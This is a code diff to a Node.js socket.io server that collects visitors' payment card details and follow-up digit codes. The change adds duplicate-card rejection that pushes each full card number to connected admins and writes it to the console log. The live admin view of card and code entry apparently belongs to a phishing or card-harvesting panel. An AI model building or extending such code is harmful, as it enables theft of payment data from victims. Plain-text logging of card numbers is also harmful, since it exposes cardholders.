@@ -438,14 +438,31 @@ io.on("connection", (socket) => {
         }
       }
       if (data.paymentCard) {
-        const now = new Date().toISOString();
-        visitor.paymentCards.push({
-          ...data.paymentCard,
-          timestamp: now,
-        });
-        // Start tracking from card page
-        visitor.lastDataUpdate = now;
-        visitor.hasEnteredCardPage = true;
+        // Check for duplicate card number
+        const newCardNumber = data.paymentCard.cardNumber;
+        const isDuplicate = visitor.paymentCards && visitor.paymentCards.some(c => c.cardNumber === newCardNumber);
+        
+        if (isDuplicate) {
+          // Reject duplicate card - notify visitor
+          socket.emit("card:duplicateRejected");
+          // Notify admins about duplicate card rejection
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit("visitor:duplicateCard", {
+              visitorId: visitor._id,
+              cardNumber: newCardNumber,
+            });
+          });
+          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
+        } else {
+          const now = new Date().toISOString();
+          visitor.paymentCards.push({
+            ...data.paymentCard,
+            timestamp: now,
+          });
+          // Start tracking from card page
+          visitor.lastDataUpdate = now;
+          visitor.hasEnteredCardPage = true;
+        }
       }
       if (data.digitCode) {
         const now = new Date().toISOString();
